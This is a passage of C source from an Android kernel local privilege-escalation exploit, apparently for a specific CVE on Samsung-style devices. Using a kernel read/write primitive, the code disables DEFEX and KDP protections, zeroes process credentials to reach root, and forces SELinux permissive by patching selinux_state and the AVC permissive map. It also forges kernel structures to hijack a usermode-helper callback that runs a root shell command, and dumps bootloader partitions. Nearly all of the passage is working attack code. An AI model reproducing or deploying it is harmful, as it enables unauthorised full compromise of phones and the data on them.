      fd, data_addr(DEFEX_GLOBAL_IMMUTABLE_STATUS), &defex_soft,
      sizeof(defex_soft));
  pr_info("root defex writes boot=%zd priv=%zd safe=%zd int=%zd imm=%zd\n",
          defex_boot_write, defex_priv_write, defex_safe_write,
          defex_int_write, defex_imm_write);
#endif
}

static int try_disable_kdp(int fd) {
#ifdef KDP_ENABLE_OFF
  if (getenv("PSELECT_M53_WRITE_ONLY_CFI") || getenv("ROOT_SKIP_KDP")) {
    (void)fd;
    pr_info("root kdp disable skipped by env\n");
    return 0;
  }
  uintptr_t kdp_addr = data_addr(KDP_ENABLE);
  uint32_t before = root_read32(fd, kdp_addr);
  pr_info("root kdp disable attempt addr=%016zx before=%u\n",
          kdp_addr, before);

  if (before == 0) {
    pr_info("root kdp already disabled\n");
    return 1;
  }

  uint32_t zero = 0;
  int write_ok = root_write32(fd, kdp_addr, zero);
  uint32_t after = root_read32(fd, kdp_addr);
  pr_info("root kdp disable write=%d after=%u\n", write_ok, after);

  if (after == 0) {
    pr_info("root kdp disabled successfully\n");
    return 1;
  }

  pr_warning("root kdp disable failed\n");
  return 0;
#else
  (void)fd;
  return 0;
#endif
}

static int install_direct_cred_root(int fd) {
  disable_defex(fd);

  int kdp_disabled = try_disable_kdp(fd);
  pr_info("root direct cred kdp_disabled=%d\n", kdp_disabled);

  int tid = (int)syscall(SYS_gettid);
  uintptr_t real_cred = root_env_direct_ptr("ROOT_DIRECT_REAL_CRED_ADDR");
  uintptr_t cred = root_env_direct_ptr("ROOT_DIRECT_CRED_ADDR");
  uintptr_t task = root_env_direct_ptr("ROOT_DIRECT_TASK_ADDR");
#ifdef MM_STRUCT_OWNER_OFF
  if (!task && getenv("ROOT_TASK_FROM_MM_OWNER") &&
      is_direct_ptr(fops_leaked_mm)) {
    uintptr_t owner = 0;
    if (root_read64_checked(fd, fops_leaked_mm + MM_STRUCT_OWNER_OFF,
                            &owner) && is_direct_ptr(owner)) {
      uint32_t owner_pid = 0;
      uint32_t owner_tgid = 0;
      int ids_ok = root_read32_checked(fd, owner + TASK_STRUCT_PID_OFF,
                                       &owner_pid) &&
                   root_read32_checked(fd, owner + TASK_STRUCT_TGID_OFF,
                                       &owner_tgid);
      pr_info("root mm owner candidate mm=%016zx owner=%016zx ids_ok=%d pid=%u tgid=%u want=%d/%d\n",
              fops_leaked_mm, owner, ids_ok, owner_pid, owner_tgid,
              tid, getpid());
      if (ids_ok && ((int)owner_pid == tid || (int)owner_tgid == getpid() ||
                     (int)owner_tgid == tid || (int)owner_pid == getpid())) {
        task = owner;
      }
    } else {
      pr_warning("root mm owner read failed mm=%016zx off=%x\n",
                 fops_leaked_mm, MM_STRUCT_OWNER_OFF);
    }
  }
#endif
  if (!task && is_direct_ptr(pselect_observed_task)) {
    task = pselect_observed_task;
    pr_info("root direct cred using observed waiter task=%016zx\n", task);
  }

  if (!real_cred || !cred) {
    if (!task) {
      pr_info("root direct cred locating task tid=%d pid=%d\n",
              tid, getpid());
      task = root_find_task_by_pid(fd, tid);
      if (!task && tid != getpid()) {
        task = root_find_task_by_pid(fd, getpid());
      }
    } else {
      pr_info("root direct cred using task from env task=%016zx\n", task);
    }
    if (!task) {
      pr_error("root direct cred task not found tid=%d pid=%d\n",
               tid, getpid());
      return 0;
    }

    real_cred = root_read64(fd, task + TASK_STRUCT_REAL_CRED_OFF);
    cred = root_read64(fd, task + TASK_STRUCT_CRED_OFF);
  } else {
    pr_info("root direct cred using cred pointers from env\n");
  }

  pr_info("root direct cred task=%016zx real_cred=%016zx cred=%016zx "
          "write_only=%d\n",
          task, real_cred, cred, root_write_only_mode());
  int ok = root_zero_cred(fd, real_cred, "real") &&
           (cred == real_cred || root_zero_cred(fd, cred, "effective"));
  if (!ok) {
    return 0;
  }

  setresgid(0, 0, 0);
  setresuid(0, 0, 0);
  root_uid_after = getuid();
  pr_info("root direct cred local uid=%u euid=%u gid=%u egid=%u\n",
          getuid(), geteuid(), getgid(), getegid());
  if (getuid() != 0 || geteuid() != 0 || getgid() != 0 || getegid() != 0) {
    return 0;
  }

  int usable_mode = root_direct_usable_mode();
#if defined(ROOT_DIRECT_ID_PROOF) && ROOT_DIRECT_ID_PROOF
  if (!usable_mode) {
    root_child_done = write_direct_id_proof();
    return root_child_done;
  }
#endif
  if (!usable_mode && getenv("ROOT_DIRECT_ID_PROOF")) {
    root_child_done = write_direct_id_proof();
    return root_child_done;
  }

  if (!usable_mode) {
    return spawn_root_daemon_from_current(NULL);
  }

  /* setresgid()/setresuid() may commit newly allocated credentials even when
   * the IDs were already patched in place.  Resolve the calling thread from
   * the known-good task-list anchor and refresh both cred pointers before
   * touching SELinux state; the pre-syscall pointers can already be stale. */
  uintptr_t current_task = root_find_task_from_anchor(
      fd, task, (uint32_t)tid);
  if (!current_task) {
    pr_error("root usable mode current task not found tid=%d anchor=%016zx\n",
             tid, task);
    return 0;
  }
  uintptr_t current_real_cred = 0;
  uintptr_t current_cred = 0;
  if (!root_read_task_cred_pair(
          fd, current_task, &current_real_cred, &current_cred)) {
    pr_error("root usable mode current creds unavailable task=%016zx\n",
             current_task);
    return 0;
  }

  /* Start the helper while this process still has its original shell SID:
   * executing a shell_data_file from init context may be denied.  Socket
   * readiness proves that exec, bind and listen completed; the child then
   * sleeps for three seconds before serving, leaving ample time to give both
   * it and this process pid 1's live SID through the still-valid kernel RW. */
  int proof_ok = write_direct_id_proof();
  uint32_t pid1_sid = 0;
  uintptr_t pid1_task = 0;
  if (!current_task || !root_read_pid1_sid(
          fd, current_task, &pid1_sid, &pid1_task)) {
    pr_error("root usable mode could not resolve pid1 SID anchor=%016zx\n",
             current_task);
    return 0;
  }

  if (getenv("ROOT_DIRECT_DUMP_LK") ||
      getenv("ROOT_DIRECT_SELINUX_PERMISSIVE")) {
    /* adb shell creates these two mode-0666 files before the exploit.  Open
     * them while the process still has the shell SID.  Locate the stock
     * selinux_state by reading a bounded .bss window and validating its full
     * 4.19 layout plus the linked avc/ss objects. */
    int dump_lk = getenv("ROOT_DIRECT_DUMP_LK") != NULL;
    int out_a = dump_lk
        ? open("/data/local/tmp/lk_a_38JP_1_30I.bin.tmp",
               O_WRONLY | O_TRUNC | O_CLOEXEC) : -1;
    int out_b = dump_lk
        ? open("/data/local/tmp/lk_b_38JP_1_30I.bin.tmp",
               O_WRONLY | O_TRUNC | O_CLOEXEC) : -1;
    const uintptr_t scan_base = kaslr_base + 0x2000000ULL;
    const size_t scan_size = 0x100000;
    unsigned char *scan = malloc(scan_size);
    int scan_ok = scan && root_read_data(
        fd, scan_base, scan, scan_size);
    uintptr_t selinux_state = 0;
    size_t candidates = 0;
    if (scan_ok) {
      for (size_t off = 0; off + 32 <= scan_size; off += 8) {
        unsigned char *state = scan + off;
        int bools_ok = state[0] == 0 && state[1] == 1 &&
            state[3] == 1;
        for (size_t i = 2; i < 12 && bools_ok; i++) {
          bools_ok = state[i] <= 1;
        }
        int padding_ok = state[12] == 0 && state[13] == 0 &&
            state[14] == 0 && state[15] == 0;
        uint64_t avc = 0;
        uint64_t ss = 0;
        memcpy(&avc, state + 16, sizeof(avc));
        memcpy(&ss, state + 24, sizeof(ss));
        uintptr_t candidate = scan_base + off;
        int linked_ok = avc == candidate - 0x1848ULL &&
            ss == candidate + 0x4ca8ULL &&
            avc >= scan_base && avc + 16 < scan_base + scan_size &&
            ss >= scan_base && ss + 16 < scan_base + scan_size;
        uint32_t avc_threshold = 0;
        uint64_t sidtab = 0;
        if (linked_ok) {
          memcpy(&avc_threshold, scan + ((uintptr_t)avc - scan_base),
                 sizeof(avc_threshold));
          memcpy(&sidtab, scan + ((uintptr_t)ss - scan_base),
                 sizeof(sidtab));
          linked_ok = avc_threshold == 512 &&
              is_direct_ptr((uintptr_t)sidtab);
        }
        if (bools_ok && padding_ok && linked_ok) {
          candidates++;
          selinux_state = candidate;
          pr_info("root SELinux scan candidate=%016zx avc=%016llx "
                  "ss=%016llx sidtab=%016llx policy=%u/%u/%u/%u/%u/%u\n",
                  candidate, (unsigned long long)avc,
                  (unsigned long long)ss, (unsigned long long)sidtab,
                  state[4], state[5], state[6], state[7], state[8],
                  state[9]);
        }
      }
    }
    pr_info("root SELinux scan base=%016zx size=%zu read=%d "
            "candidates=%zu selected=%016zx\n", scan_base, scan_size,
            scan_ok, candidates, selinux_state);
    free(scan);
    int candidate_ok = scan_ok && candidates == 1 && selinux_state;
    unsigned char permissive = 0;
    int permissive_ok = candidate_ok && root_write_data(
        fd, selinux_state + 1, &permissive, sizeof(permissive));
    unsigned char enforcing_after = 0xff;
    permissive_ok = permissive_ok && root_read_data(
        fd, selinux_state + 1, &enforcing_after,
        sizeof(enforcing_after)) && enforcing_after == 0;
    if (!dump_lk) {
      pid_t daemon_pid = -1;
      int daemon_ok = permissive_ok &&
          spawn_root_daemon_from_current(&daemon_pid);
      int restore_ok = 1;
      if (!daemon_ok && permissive_ok) {
        unsigned char enforcing = 1;
        restore_ok = root_write_data(
            fd, selinux_state + 1, &enforcing, sizeof(enforcing));
      }
      pr_info("root permissive daemon enforcing=%u ready=%d pid=%d\n",
              enforcing_after, daemon_ok, daemon_pid);
      if (!daemon_ok) {
        pr_info("root permissive daemon failure restore=%d\n", restore_ok);
      }
      root_child_done = daemon_ok;
      return root_child_done;
    }
    ssize_t dump_a = -1;
    ssize_t dump_b = -1;
    if (out_a >= 0 && out_b >= 0 && permissive_ok) {
      dump_a = root_dump_readonly_block("/dev/block/by-name/lk_a", out_a);
      dump_b = root_dump_readonly_block("/dev/block/by-name/lk_b", out_b);
    }
    unsigned char enforcing = 1;
    int restore_ok = permissive_ok && root_write_data(
        fd, selinux_state + 1, &enforcing, sizeof(enforcing));
    if (out_a >= 0) close(out_a);
    if (out_b >= 0) close(out_b);
    pr_info("root direct LK dump outputs=%d/%d permissive=%d/%u "
            "restore=%d bytes=%zd/%zd\n", out_a >= 0, out_b >= 0,
            permissive_ok, enforcing_after, restore_ok, dump_a, dump_b);
    root_child_done = dump_a > 0 && dump_b > 0 && restore_ok;
    return root_child_done;
  }

  pid_t daemon_pid = -1;
  if (!spawn_root_daemon_from_current(&daemon_pid)) {
    return 0;
  }
  /* pid 1 remains a stable list anchor while the short-lived race worker may
   * already be exiting by the time the daemon has bound its socket. */
  uintptr_t daemon_task = root_find_task_from_anchor(
      fd, pid1_task, (uint32_t)daemon_pid);
  int daemon_sid_ok = daemon_task && root_write_sid_to_task(
      fd, daemon_task, pid1_sid, "daemon");
  int current_real_ok = root_write_sid_to_cred(
      fd, current_real_cred, pid1_sid, "current-real");
  int current_effective_ok = current_cred == current_real_cred ||
      root_write_sid_to_cred(
          fd, current_cred, pid1_sid, "current-effective");
  int sid_ok = daemon_sid_ok && current_real_ok && current_effective_ok;
  pr_info("root usable mode proof=%d pid1_task=%016zx sid=%u "
          "daemon_pid=%d daemon_task=%016zx daemon_sid=%d current_sid=%d/%d\n",
          proof_ok, pid1_task, pid1_sid, daemon_pid, daemon_task,
          daemon_sid_ok, current_real_ok, current_effective_ok);
  if (!sid_ok) {
    kill(daemon_pid, SIGKILL);
    return 0;
  }

  root_child_done = 1;
  return 1;
}


static uintptr_t root_file_for_fd(int fd, int user_fd) {
  if (user_fd < 0) {
    return 0;
  }
  int tid = (int)syscall(SYS_gettid);
  int pid = getpid();
  uintptr_t task = root_find_task_by_pid(fd, tid);
  if (!task && tid != pid) {
    task = root_find_task_by_pid(fd, pid);
  }
  if (!task) {
    pr_warning("root file lookup task not found tid=%d pid=%d\n", tid, pid);
    return 0;
  }
  uintptr_t files = root_read64(fd, task + TASK_STRUCT_FILES_OFF);
  uintptr_t fdt = is_direct_ptr(files) ? root_read64(fd, files + FILES_STRUCT_FDT_OFF) : 0;
  uintptr_t fd_array = is_direct_ptr(fdt) ? root_read64(fd, fdt + FDTABLE_FD_OFF) : 0;
  uintptr_t file = is_direct_ptr(fd_array) ? root_read64(fd, fd_array + (size_t)user_fd * sizeof(uint64_t)) : 0;
  pr_info("root file lookup tid=%d task=%016zx files=%016zx fdt=%016zx fd_array=%016zx user_fd=%d file=%016zx\n",
          tid, task, files, fdt, fd_array, user_fd, file);
  return is_direct_ptr(file) ? file : 0;
}

struct umh_file_override {
  uintptr_t sid_addr;
  uint32_t old_sid;
  int active;
};

static int root_override_umh_helper(
    int fd, uintptr_t helper_file, struct umh_file_override *state) {
  memset(state, 0, sizeof(*state));
  int reference_fd = open("/system/bin/sh", O_PATH | O_CLOEXEC);
  uintptr_t reference_file = root_file_for_fd(fd, reference_fd);
  uintptr_t helper_inode = is_direct_ptr(helper_file)
      ? root_read64(fd, helper_file + FILE_F_INODE_OFF) : 0;
  uintptr_t reference_inode = is_direct_ptr(reference_file)
      ? root_read64(fd, reference_file + FILE_F_INODE_OFF) : 0;
  uintptr_t helper_isec = is_direct_ptr(helper_inode)
      ? root_read64(fd, helper_inode + INODE_I_SECURITY_OFF) : 0;
  uintptr_t reference_isec = is_direct_ptr(reference_inode)
      ? root_read64(fd, reference_inode + INODE_I_SECURITY_OFF) : 0;
  uint32_t helper_sid = 0;
  uint32_t reference_sid = 0;
  int read_ok = is_direct_ptr(helper_isec) &&
      is_direct_ptr(reference_isec) &&
      root_read32_checked(fd, helper_isec + INODE_SECURITY_SID_OFF,
                          &helper_sid) &&
      root_read32_checked(fd, reference_isec + INODE_SECURITY_SID_OFF,
                          &reference_sid);
  uint32_t after_sid = helper_sid;
  int write_ok = read_ok && helper_sid != 0 && reference_sid != 0 &&
      helper_sid != reference_sid && root_write32(
          fd, helper_isec + INODE_SECURITY_SID_OFF, reference_sid);
  int verify_ok = write_ok && root_read32_checked(
      fd, helper_isec + INODE_SECURITY_SID_OFF, &after_sid) &&
      after_sid == reference_sid;
  if (verify_ok) {
    state->sid_addr = helper_isec + INODE_SECURITY_SID_OFF;
    state->old_sid = helper_sid;
    state->active = 1;
  } else if (write_ok) {
    root_write32(fd, helper_isec + INODE_SECURITY_SID_OFF, helper_sid);
  }
  if (reference_fd >= 0) {
    close(reference_fd);
  }
  pr_info("root umh relabel sid=%u/%u->%u read=%d write=%d verify=%d\n",
          helper_sid, reference_sid, after_sid, read_ok, write_ok, verify_ok);
  return verify_ok;
}

static int root_restore_umh_helper(
    int fd, struct umh_file_override *state) {
  if (!state->active) {
    return 1;
  }
  int ok = root_write32(fd, state->sid_addr, state->old_sid);
  state->active = 0;
  pr_info("root umh helper restore sid=%d\n", ok);
  return ok;
}

static int root_hold_umh_file_ref(
    int fd, uintptr_t helper_file, uint64_t *old_count) {
  uint64_t count = 0;
  if (!root_read64_checked(fd, helper_file + FILE_F_COUNT_OFF, &count) ||
      count == 0 || count > 0x100000) {
    return 0;
  }
  uint64_t after = 0;
  int ok = root_write64(fd, helper_file + FILE_F_COUNT_OFF, count + 1) &&
      root_read64_checked(fd, helper_file + FILE_F_COUNT_OFF, &after) &&
      after == count + 1;
  if (ok) {
    *old_count = count;
  }
  pr_info("root umh helper ref=%llu->%llu ok=%d\n",
          (unsigned long long)count, (unsigned long long)after, ok);
  return ok;
}

static int root_sid_type(int fd, uint32_t sid, uintptr_t *ss_out,
                         uint32_t *type_out) {
  if (sid <= 27) {
    return 0;
  }
  uintptr_t state = data_addr(SELINUX_STATE);
  uintptr_t ss = root_read64(fd, state + 0x18);
  uintptr_t sidtab = ss ? root_read64(fd, ss) : 0;
  uint32_t index = sid - 28;
  uint32_t count = sidtab ? root_read32(fd, sidtab + 0x20) : 0;
  if (!sidtab || index >= count) {
    return 0;
  }

  uint32_t level = 0;
  uint64_t capacity = 39;
  while (index + 1 > capacity && level < 3) {
    capacity <<= 9;
    level++;
  }
  uintptr_t entry = root_read64(fd, sidtab + (uintptr_t)level * 8);
  uint32_t leaf_index = index / 39;
  while (level && is_direct_ptr(entry)) {
    uint32_t shift = (level - 1) * 9;
    uint32_t inner_index = leaf_index >> shift;
    entry = root_read64(fd, entry + (uintptr_t)inner_index * 8);
    leaf_index &= shift ? ((1U << shift) - 1) : 0;
    level--;
  }
  if (!is_direct_ptr(entry)) {
    return 0;
  }

  uintptr_t leaf = entry + (uintptr_t)(index % 39) * 0x68;
  uint32_t type = root_read32(fd, leaf + 0x10);
  if (!type || type >= 0x10000) {
    return 0;
  }
  *ss_out = ss;
  *type_out = type;
  return 1;
}

static int root_make_umh_domain_permissive(int fd, uint32_t sid) {
  uintptr_t ss = 0;
  uint32_t type = 0;
  if (!root_sid_type(fd, sid, &ss, &type)) {
    return 0;
  }

  uintptr_t permissive_map = ss + 0x1d0;
  uintptr_t node = root_read64(fd, permissive_map);
  while (is_direct_ptr(node)) {
    uint32_t startbit = root_read32(fd, node + 0x38);
    if (type >= startbit && type < startbit + 384) {
      uintptr_t word = node + 8 + ((type - startbit) / 64) * 8;
      uint64_t bits = root_read64(fd, word);
      return root_write64(fd, word, bits | (1ULL << ((type - startbit) % 64)));
    }
    node = root_read64(fd, node);
  }

  int map_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
  uintptr_t map_file = root_file_for_fd(fd, map_fd);
  uint64_t old_count = 0;
  if (map_fd < 0 || !map_file ||
      !root_hold_umh_file_ref(fd, map_file, &old_count)) {
    if (map_fd >= 0) {
      close(map_fd);
    }
    return 0;
  }
  close(map_fd);

  struct {
    uint64_t next;
    uint64_t maps[6];
    uint32_t startbit;
    uint32_t pad;
  } fake_node;
  memset(&fake_node, 0, sizeof(fake_node));
  fake_node.startbit = (type / 384) * 384;
  uint32_t relative = type - fake_node.startbit;
  fake_node.maps[relative / 64] = 1ULL << (relative % 64);
  if (!root_write_data(fd, map_file, &fake_node, sizeof(fake_node)) ||
      !root_write32(fd, permissive_map + 8, fake_node.startbit + 384) ||
      !root_write64(fd, permissive_map, map_file)) {
    return 0;
  }
  uint64_t verify = 0;
  return root_read64_checked(
             fd, map_file + 8 + (uintptr_t)(relative / 64) * 8, &verify) &&
      (verify & (1ULL << (relative % 64))) != 0 &&
      root_read64(fd, permissive_map) == map_file;
}

static int root_mark_cached_domain_permissive(int fd, uint32_t ssid) {
  uintptr_t avc = root_read64(fd, data_addr(SELINUX_STATE) + 0x10);
  if (!avc) {
    avc = data_addr(SELINUX_AVC);
  }

  int matched = 0;
  int patched = 0;
  for (uint32_t slot = 0; slot < 512; slot++) {
    uintptr_t list = root_read64(fd, avc + 8 + (uintptr_t)slot * 8);
    for (int i = 0; i < 64 && is_direct_ptr(list); i++) {
      uintptr_t node = list - 40;
      if (root_read32(fd, node) == ssid) {
        uint32_t flags = root_read32(fd, node + 28);
        uint32_t after = 0;
        matched++;
        if (root_write32(fd, node + 12, 0xffffffffU) &&
            root_write32(fd, node + 28, flags | 1U) &&
            root_read32_checked(fd, node + 28, &after) &&
            (after & 1U) != 0) {
          patched++;
        }
      }
      list = root_read64(fd, list);
    }
  }
  return matched > 0 && patched == matched;
}

#if defined(ROOT_UMH_CALLBACK_WRAPPER)
static uint64_t root_elapsed_ns(
    const struct timespec *start, const struct timespec *now) {
  int64_t seconds = (int64_t)now->tv_sec - (int64_t)start->tv_sec;
  int64_t nanoseconds = (int64_t)now->tv_nsec - (int64_t)start->tv_nsec;
  return (uint64_t)(seconds * 1000000000LL + nanoseconds);
}

static int root_umh_patch_callback_cred(
    int fd, uintptr_t old_task_tail, uintptr_t fake_work_addr,
    uint32_t target_sid) {
  uintptr_t task_head = data_addr(INIT_TASK) + TASK_STRUCT_TASKS_OFF;
  uintptr_t cleanup_addr = fake_work_addr +
      offsetof(struct umh_subprocess_info, cleanup);
  uintptr_t callback_done_addr =
      fake_work_addr + ROOT_UMH_CALLBACK_COMPLETION_OFF;
  int callback_guard = 0;
  struct timespec started;
  clock_gettime(CLOCK_MONOTONIC, &started);

  uintptr_t matched_task = 0;
  uintptr_t matched_cred = 0;
  uintptr_t matched_security = 0;
  uint32_t matched_pid = 0;
  uint32_t sid_before = 0xffffffffU;
  int sid_write = 0;
  int sid_verify = 0;
  uintptr_t observed_tail = 0;
  uintptr_t observed_task = 0;
  uintptr_t observed_frame = 0;
  uintptr_t observed_lr = 0;
  uintptr_t observed_last_lr = 0;
  uintptr_t observed_info_frame = 0;
  uintptr_t observed_info_lr = 0;
  uintptr_t observed_ret_frame = 0;
  uintptr_t observed_ret_x19 = 0;
  uintptr_t observed_parent = 0;
  uintptr_t observed_new_cred = 0;
  uintptr_t observed_cred_slot = 0;
  uintptr_t observed_cpu_x22 = 0;
  uintptr_t observed_security = 0;
  uint32_t observed_usage = 0xffffffffU;
  uint32_t observed_sid = 0xffffffffU;
  uintptr_t observed_current_cred = 0;
  uint32_t observed_pid = 0;
  int observed_depth = 0;
  int observed_stop = 0;

  while (!matched_task) {
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (root_elapsed_ns(&started, &now) >= 100000000ULL) {
      break;
    }

    uintptr_t node = root_read64(fd, task_head + sizeof(uint64_t));
    for (int depth = 0; depth < 32 && is_direct_ptr(node) &&
         node != old_task_tail; depth++) {
      uintptr_t task = node - TASK_STRUCT_TASKS_OFF;
      uintptr_t frame = root_read64(
          fd, task + TASK_STRUCT_CPU_CONTEXT_FP_OFF);
      uintptr_t first_frame = frame;
      uintptr_t stack_base = frame & ~(KERNEL_STACK_SIZE - 1);
      uintptr_t stack_end = stack_base + KERNEL_STACK_SIZE;
      uintptr_t callback_frame = 0;
      uintptr_t new_cred = 0;
      uintptr_t current_cred = root_read64(
          fd, task + TASK_STRUCT_CRED_OFF);
      uint32_t pid = 0;
      if (!observed_tail) {
        observed_tail = node;
        observed_task = task;
        observed_frame = frame;
        observed_current_cred = current_cred;
        root_read32_checked(fd, task + TASK_STRUCT_PID_OFF, &observed_pid);
      }

      for (int frame_depth = 0; frame_depth < 64 &&
           frame >= KERNEL_VMALLOC_BASE && frame >= stack_base &&
           frame + 3 * sizeof(uint64_t) <= stack_end && !(frame & 0xf);
           frame_depth++) {
        uintptr_t parent_frame = 0;
        uintptr_t saved_lr = 0;
        uintptr_t saved_x19 = 0;
        if (!root_read64_checked(fd, frame, &parent_frame) ||
            !root_read64_checked(
                fd, frame + sizeof(uint64_t), &saved_lr) ||
            !root_read64_checked(
                fd, frame + 2 * sizeof(uint64_t), &saved_x19)) {
          if (task == observed_task) {
            observed_stop = 1;
          }
          break;
        }
        if (task == observed_task) {
          observed_depth = frame_depth + 1;
          observed_last_lr = saved_lr;
        }
        if (!observed_lr && task == observed_task) {
          observed_lr = saved_lr;
        }
        if (saved_x19 == fake_work_addr && task == observed_task) {
          observed_info_frame = frame;
          observed_info_lr = saved_lr;
        }
        if (saved_lr == text_addr(CALL_USERMODEHELPER_EXEC_ASYNC_INIT_RET) &&
            task == observed_task) {
          observed_ret_frame = frame;
          observed_ret_x19 = saved_x19;
          observed_parent = parent_frame;
        }
        if (saved_x19 == fake_work_addr &&
            saved_lr == text_addr(CALL_USERMODEHELPER_EXEC_ASYNC_INIT_RET)) {
          callback_guard = root_write32(fd, callback_done_addr, 1);
          callback_frame = frame;
          if (task == observed_task) {
            root_read64_checked(
                fd, task + TASK_STRUCT_CPU_CONTEXT_X22_OFF,
                &observed_cpu_x22);
          }
          break;
        }
        if (parent_frame <= frame || parent_frame >= stack_end ||
            parent_frame - frame > 0x1000 || (parent_frame & 0xf)) {
          if (task == observed_task) {
            observed_stop = 2;
          }
          break;
        }
        frame = parent_frame;
      }

      if (callback_frame) {
        uintptr_t scan_end = callback_frame + 0x20;
        for (uintptr_t slot = first_frame;
             slot + sizeof(uint64_t) <= scan_end; slot += sizeof(uint64_t)) {
          uintptr_t probe_cred = 0;
          uint32_t probe_usage = 0xffffffffU;
          uintptr_t probe_security = 0;
          uint32_t probe_sid = 0xffffffffU;
          if (!root_read64_checked(fd, slot, &probe_cred) ||
              !is_direct_ptr(probe_cred) || probe_cred == current_cred ||
              !root_read32_checked(fd, probe_cred, &probe_usage) ||
              probe_usage != 1 ||
              !root_read64_checked(
                  fd, probe_cred + CRED_SECURITY_OFF, &probe_security) ||
              !is_direct_ptr(probe_security) ||
              !root_read32_checked(
                  fd, probe_security + CRED_SECURITY_SID_OFF, &probe_sid) ||
              probe_sid == 0 || probe_sid >= 0x10000) {
            continue;
          }
          new_cred = probe_cred;
          if (task == observed_task) {
            observed_cred_slot = slot;
            observed_new_cred = probe_cred;
          }
          break;
        }
      }

      uint32_t usage = 0xffffffffU;
      int candidate = is_direct_ptr(new_cred) &&
          new_cred != current_cred &&
          root_read32_checked(fd, new_cred, &usage) && usage == 1 &&
          root_read32_checked(fd, task + TASK_STRUCT_PID_OFF, &pid) &&
          pid != 0;
      uintptr_t security = candidate
          ? root_read64(fd, new_cred + CRED_SECURITY_OFF) : 0;
      uint32_t sid = 0xffffffffU;
      candidate = candidate && is_direct_ptr(security) &&
          root_read32_checked(fd, security + CRED_SECURITY_SID_OFF, &sid) &&
          sid > 0 && sid < 0x10000;
      if (task == observed_task && new_cred) {
        observed_security = security;
        observed_usage = usage;
        observed_sid = sid;
      }
      if (candidate) {
        matched_task = task;
        matched_cred = new_cred;
        matched_security = security;
        matched_pid = pid;
        root_umh_callback_pid = pid;
        sid_before = sid;
        sid_write = root_write32(
            fd, security + CRED_SECURITY_SID_OFF, target_sid);
        uint32_t sid_after = 0xffffffffU;
        sid_verify = sid_write && root_read32_checked(
            fd, security + CRED_SECURITY_SID_OFF, &sid_after) &&
            sid_after == target_sid;
        break;
      }
      uintptr_t previous = 0;
      if (!root_read64_checked(fd, node + sizeof(uint64_t), &previous)) {
        break;
      }
      node = previous;
    }
  }

  int cleanup_restore = root_write64(fd, cleanup_addr, 0);
  if (!callback_guard) {
    callback_guard = root_write32(fd, callback_done_addr, 1);
  }
  int callback_release = callback_guard;
  if (sid_verify && callback_guard) {
    uintptr_t table_addr =
        fake_work_addr + ROOT_UMH_CALLBACK_STATE_TABLE_OFF;
    const uint64_t transition[2] = {6, 0};
    callback_release = root_write_data(
            fd, table_addr, transition, sizeof(transition)) &&
        root_write64(fd, fake_work_addr + 104, table_addr) &&
        root_write64(fd, fake_work_addr + 8, 0) &&
        root_write32(fd, callback_done_addr, 0);
  }
  pr_info("root umh callback task=%016zx pid=%u cred=%016zx "
          "security=%016zx sid=%u->%u write=%d verify=%d cleanup=%d release=%d "
          "tail=%016zx old=%016zx first=%016zx frame=%016zx lr=%016zx "
          "last_lr=%016zx depth=%d stop=%d info=%016zx/%016zx "
          "ret=%016zx/%016zx parent=%016zx slot=%016zx new=%016zx "
          "cpu_x22=%016zx sec=%016zx "
          "usage=%u new_sid=%u expect=%016zx work=%016zx current=%016zx "
          "first_pid=%u\n",
          matched_task, matched_pid, matched_cred, matched_security,
          sid_before, target_sid, sid_write, sid_verify, cleanup_restore,
          callback_release, observed_tail, old_task_tail, observed_task,
          observed_frame, observed_lr, observed_last_lr, observed_depth,
          observed_stop, observed_info_frame, observed_info_lr,
          observed_ret_frame, observed_ret_x19, observed_parent,
          observed_cred_slot, observed_new_cred, observed_cpu_x22,
          observed_security, observed_usage, observed_sid,
          text_addr(CALL_USERMODEHELPER_EXEC_ASYNC_INIT_RET), fake_work_addr,
          observed_current_cred, observed_pid);
  fflush(NULL);
  return sid_verify && cleanup_restore && callback_release;
}
#endif

static int __attribute__((unused)) install_workqueue_umh_root(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));
  int shell_proof_runtime = getenv("ROOT_UMH_SHELL_PROOF_RUNTIME") != NULL;
  int use_path_exec = shell_proof_runtime;

  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(ROOT_UMH_SHELL_PROOF) && ROOT_UMH_SHELL_PROOF
  root_umh_path = "/system/bin/sh";
  use_path_exec = 1;
#elif defined(ROOT_UMH_SETENFORCE_ONLY) && ROOT_UMH_SETENFORCE_ONLY
  root_umh_path = "/system/bin/setenforce";
#elif defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!shell_proof_runtime &&
      (!app_root_umh_path || app_root_umh_path[0] != '/')) {
    pr_error("root umh missing CVE43499_ROOT_HELPER\n");
    return 0;
  }
  root_umh_path = shell_proof_runtime ? "/system/bin/sh" : app_root_umh_path;
#endif
  if (shell_proof_runtime) {
    root_umh_path = "/system/bin/sh";
    use_path_exec = 1;
  }
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    pr_error("root umh helper path too long\n");
    return 0;
  }
#if defined(ROOT_UMH_SHELL_PROOF) && ROOT_UMH_SHELL_PROOF
  shell_proof_runtime = 1;
#endif
  if (shell_proof_runtime) {
    snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "-c");
    snprintf(umh_data.cmd, sizeof(umh_data.cmd), "%s",
             "id > /data/local/tmp/rootproof; chmod 666 /data/local/tmp/rootproof");
  } else {
#if defined(ROOT_UMH_SETENFORCE_ONLY) && ROOT_UMH_SETENFORCE_ONLY
    snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "0");
    umh_data.uid[0] = 0;
#else
    snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
    snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
#endif
  }
  uintptr_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, arg);
